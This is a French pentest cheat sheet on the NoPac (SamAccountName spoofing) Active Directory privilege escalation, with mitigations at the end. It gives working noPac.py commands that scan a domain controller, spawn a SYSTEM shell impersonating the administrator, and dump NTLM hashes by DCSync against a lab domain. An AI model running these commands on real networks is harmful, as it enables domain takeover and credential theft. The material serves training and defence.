# NoPac (SamAccountName Spoofing)

### <mark style="color:red;">NoPac (SamAccountName Spoofing)</mark>

***

La vulnérabilité _NoPac_ (aussi appelée _Sam\_The\_Admin_ ou _SamAccountName Spoofing_) est une menace émergente découverte fin 2021. Elle exploite deux vulnérabilités critiques de Windows Active Directory :

* **CVE-2021-42278** : Permet de modifier le SamAccountName d'un compte machine.
* **CVE-2021-42287** : Affecte le processus d'authentification Kerberos en permettant l'usurpation d'identité d'un DC.

En combinant ces deux failles, un attaquant peut escalader ses privilèges d'un simple utilisateur de domaine à un administrateur de domaine en une seule commande.

***

<mark style="color:green;">**Principe**</mark> <mark style="color:green;">**de**</mark> <mark style="color:green;">**l'attaque**</mark>

1. **Modification du SamAccountName** : L'attaquant modifie le nom de compte d'une machine pour correspondre à celui d'un DC.
2. **Obtention d'un Ticket Kerberos** : En demandant un Ticket-Granting Service (TGS), le service d'authentification Kerberos émet un ticket en fonction du nom le plus proche, accordant ainsi des privilèges élevés.
3. **Exploitation finale** : Une fois en possession d'un ticket Kerberos, l'attaquant obtient un accès administrateur sur le DC et peut exécuter des commandes système.

***

<mark style="color:green;">**Exploitation avec Impacket et NoPac**</mark>

#### <mark style="color:orange;">**Installation des outils**</mark>

```bash
# Cloner et installer Impacket
$ git clone https://github.com/SecureAuthCorp/impacket.git
$ cd impacket && python setup.py install

# Cloner le dépôt NoPac
$ git clone https://github.com/Ridter/noPac.git
```

#### <mark style="color:orange;">**Vérification de la vulnérabilité**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
$ sudo python3 scanner.py inlanefreight.local/user:password -dc-ip 172.16.5.5 -use-ldap
```
{% endcode %}

#### <mark style="color:orange;">**Exploitation pour obtenir un shell SYSTEM**</mark>

{% code fullWidth="true" %}
```bash
$ sudo python3 noPac.py inlanefreight.local/user:password -dc-ip 172.16.5.5 \
    -dc-host DC_NAME -shell --impersonate administrator -use-ldap
```
{% endcode %}

Une fois exploité, un shell semi-interactif est ouvert sur le DC.

***

<mark style="color:green;">**Post-Exploitation : Dumping des Hashs avec DCSync**</mark>

{% code fullWidth="true" %}
```bash
$ sudo python3 noPac.py inlanefreight.local/user:password -dc-ip 172.16.5.5 \
    -dc-host DC_NAME --impersonate administrator -use-ldap -dump -just-dc-user inlanefreight/administrator
```
{% endcode %}

Cette commande permet d'extraire les hash NTLM des comptes sensibles (à utiliser avec `secretsdump.py`).

***

<mark style="color:green;">**Mesures de Mitigation**</mark>

* **Appliquer les correctifs** : Installer les mises à jour de Microsoft pour CVE-2021-42278 et CVE-2021-42287.
* **Désactiver la création automatique de comptes machines** : Mettre `ms-DS-MachineAccountQuota = 0` pour empêcher les utilisateurs standards d'ajouter des machines au domaine.
* **Surveiller les modifications de comptes machines** : Mettre en place des alertes SIEM sur les changements anormaux des `SamAccountName`.
* **Limiter les permissions Kerberos** : Restreindre l'accès aux tickets Kerberos pour empêcher l'usurpation d'identité.
